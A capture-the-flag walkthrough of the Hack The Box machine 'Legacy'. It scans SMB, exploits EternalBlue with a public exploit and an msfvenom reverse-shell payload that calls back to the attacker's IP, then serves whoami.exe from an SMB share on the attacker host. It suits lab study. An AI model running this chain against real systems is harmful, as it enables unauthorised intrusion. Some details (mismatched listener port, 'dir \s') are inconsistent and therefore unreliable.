## Machine IP Setup

```powershell
export IP=10.10.10.4
```

## Initial Scan

First, we can conduct the initial nmap scan with the following command:

```bash
nmap -sC -sV -O -oA nmap/initial $IP
```

The results we obtain are as follows:

![Legacy%2050ca93bd68dc4442bc3b6815174752a1/Untitled.png](Legacy%2050ca93bd68dc4442bc3b6815174752a1/Untitled.png)

The Ports that are open are:

- port 139: netbios-ssn
- port 445: microsoft-ds

## Full Scan

Next, let us conduct a full nmap scan with the following command:

```bash
nmap -sC -sV -O -p- -oA nmap/full $IP
```

The results we obtain are as follows:

![Legacy%2050ca93bd68dc4442bc3b6815174752a1/Untitled%201.png](Legacy%2050ca93bd68dc4442bc3b6815174752a1/Untitled%201.png)

There are no additional open ports.

## UDP Scan

Lastly, let us conduct a UDP nmap scan on the top 1000 UDP ports with the following command:

```bash
nmap -sU -O -p- -oA nmap/udp $IP
```

The results we obtain are as follows:

![Legacy%2050ca93bd68dc4442bc3b6815174752a1/Untitled%202.png](Legacy%2050ca93bd68dc4442bc3b6815174752a1/Untitled%202.png)

There are no additional open ports.

## Recon Results

The compiled results we obtain are as follows:

- port 139: netbios-ssn
    - (Indicating SMB is active)
- port 445: microsoft-ds
    - (Indicating SMB is active)

# Enumeration (Service Version Check)

To explore if the SMB version is vulnerable, we run the following command:

```powershell
nmap -v -script smb-vuln* -p 139,445 $IP
```

This was the result of this command:

![Legacy%2050ca93bd68dc4442bc3b6815174752a1/Untitled%203.png](Legacy%2050ca93bd68dc4442bc3b6815174752a1/Untitled%203.png)

The results of this scan are as follows:

- CVE-2008-4250
- CVE-2017-0143

# Initial Foothold

## CVE 2017-0143

Seeing that the Risk Factor is HIGH, we shall look into this CVE first.

According to [https://nvd.nist.gov/vuln/detail/cve-2017-0143](https://nvd.nist.gov/vuln/detail/cve-2017-0143), this is the description of the vulnerability:

The SMBv1 server in 

- Microsoft Windows Vista SP2;
- Windows Server 2008 SP2 and R2 SP1;
- Windows 7 SP1;
- Windows 8.1;
- Windows Server 2012 Gold and R2;
- Windows RT 8.1;
- and Windows 10 Gold, 1511, and 1607;
- and Windows Server 2016

allows remote attackers to execute arbitrary code via crafted packets, aka "Windows SMB Remote Code Execution Vulnerability." 

This vulnerability is different from those described in CVE-2017-0144, CVE-2017-0145, CVE-2017-0146, and CVE-2017-0148.

## Exploiting EternalBlue

To exploit this vulnerability, we have to first download the exploit code from Github:

```powershell
git clone https://github.com/helviojunior/MS17-010.git
```

Next we have to set up a listener:

```powershell
nc -nvlp 4444
```

This will give us the following output:

![Legacy%2050ca93bd68dc4442bc3b6815174752a1/Untitled%204.png](Legacy%2050ca93bd68dc4442bc3b6815174752a1/Untitled%204.png)

To craft the payload for the exploit, we run the following command with our kali's IP and listening port:

```powershell
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.7 LPORT=445 -f exe > eternalblue.exe
```

The compilation using msfvenom will craft an executable named eternalblue.exe as follows:

![Legacy%2050ca93bd68dc4442bc3b6815174752a1/Untitled%205.png](Legacy%2050ca93bd68dc4442bc3b6815174752a1/Untitled%205.png)

Next, we simply have to run send_and_execute.py from the exploit code we downloaded above:

![Legacy%2050ca93bd68dc4442bc3b6815174752a1/Untitled%206.png](Legacy%2050ca93bd68dc4442bc3b6815174752a1/Untitled%206.png)

On our listening port, we will see the following:

![Legacy%2050ca93bd68dc4442bc3b6815174752a1/Untitled%207.png](Legacy%2050ca93bd68dc4442bc3b6815174752a1/Untitled%207.png)

# User and Root Flag

To find the two flag files, we first head to the root directory:

![Legacy%2050ca93bd68dc4442bc3b6815174752a1/Untitled%208.png](Legacy%2050ca93bd68dc4442bc3b6815174752a1/Untitled%208.png)

Next, we can run the following command to search for user.txt:

```python
dir user.txt \s
```

And we see that it is located at C:\Documents and Settings\john\Desktop\user.txt:

![Legacy%2050ca93bd68dc4442bc3b6815174752a1/Untitled%209.png](Legacy%2050ca93bd68dc4442bc3b6815174752a1/Untitled%209.png)

Similarly, we can run the following command to search for root.txt:

```python
dir root.txt \s
```

From this, we see that it is located at C:\Documents and Settings\Administrator\Desktop\root.txt:

![Legacy%2050ca93bd68dc4442bc3b6815174752a1/Untitled%2010.png](Legacy%2050ca93bd68dc4442bc3b6815174752a1/Untitled%2010.png)

From this, we can simply navigate to the directories to retrieve the flags with type as follows

```python
cd C:\Documents and Settings\John\Desktop
```

```powershell
type user.txt
```

![Untitled](Legacy%2050ca93bd68dc4442bc3b6815174752a1/Untitled%2011.png)

```powershell
cd C:\Documents and Settings\Administrator\Desktop
```

```powershell
type root.txt
```

## whoami Issue

While I glossed over the issue (via brute force) of finding out what access we have in the reverse shell above, it is an issue that we usually have to face

If we try to run whoami, we see that whoami is unavailable:

![Legacy%2050ca93bd68dc4442bc3b6815174752a1/Untitled%2013.png](Legacy%2050ca93bd68dc4442bc3b6815174752a1/Untitled%2013.png)

Kali has a built-in fix for this problem: a whoami executable

To locate it, we run the following command:

```powershell
locate whoami.exe
```

This shows that the file is located at: /usr/share/windows-resources/binaries/whoami.exe

![Legacy%2050ca93bd68dc4442bc3b6815174752a1/Untitled%2014.png](Legacy%2050ca93bd68dc4442bc3b6815174752a1/Untitled%2014.png)

To try to transfer, we can try to see if there is netcat and powershell, but both turns out to be missing:

![Legacy%2050ca93bd68dc4442bc3b6815174752a1/Untitled%2015.png](Legacy%2050ca93bd68dc4442bc3b6815174752a1/Untitled%2015.png)

An alternative we can use (especially since the exploit we are using is via SMB) is that we can set up a SMB server to transfer the payload

First, we locate the [smbserver.py](http://smbserver.py) (the SMB server script)

```powershell
locate smbserver.py
```

![Legacy%2050ca93bd68dc4442bc3b6815174752a1/Untitled%2016.png](Legacy%2050ca93bd68dc4442bc3b6815174752a1/Untitled%2016.png)

Now, we can set up the server in the following format 
(sudo PATH_TO_SERVER_SCRIPT FOLDER_NAME PATH_TO_PAYLOAD_DIR):

```powershell
sudo /usr/lib/python3/dist-packages/impacket/smbserver.py tmp /usr/share/windows-resources/binaries
```

This will show us the following output:

![Legacy%2050ca93bd68dc4442bc3b6815174752a1/Untitled%2017.png](Legacy%2050ca93bd68dc4442bc3b6815174752a1/Untitled%2017.png)

To verify that the smbserver script has run properly, we can access the smb share with the following command: 

```powershell
smbclient //YOUR_IP/tmp
```

(Note that the root password is the password for our kali attack machine)

We can then run ls to check that the binary is available:

![Legacy%2050ca93bd68dc4442bc3b6815174752a1/Untitled%2018.png](Legacy%2050ca93bd68dc4442bc3b6815174752a1/Untitled%2018.png)

Now lastly, let us run the following command on our target machine (Legacy):

```powershell
\\10.10.14.7\tmp\whoami.exe
```

And we finally get to see that we have root:

![Legacy%2050ca93bd68dc4442bc3b6815174752a1/Untitled%2019.png](Legacy%2050ca93bd68dc4442bc3b6815174752a1/Untitled%2019.png)

# Learning Points (Additional Points)

## Line wrap

To help to wrap text on screen, we can run the following command:

```python
fold -sw 100 FILE_PATH
```

## Python pip egg_info Error

![Legacy%2050ca93bd68dc4442bc3b6815174752a1/Untitled%2020.png](Legacy%2050ca93bd68dc4442bc3b6815174752a1/Untitled%2020.png)

When facing this error, fix with:

```python
pip2 install -U setuptools
```

- -U: -upgrade Upgrade all packages to the newest available version

![Legacy%2050ca93bd68dc4442bc3b6815174752a1/Untitled%2021.png](Legacy%2050ca93bd68dc4442bc3b6815174752a1/Untitled%2021.png)

## Concatenation of Strings and Bytes

Running the scripts via python3 and python2 can lead to differences, so in these errors, we have to run it via python2

## Bypassing whoami
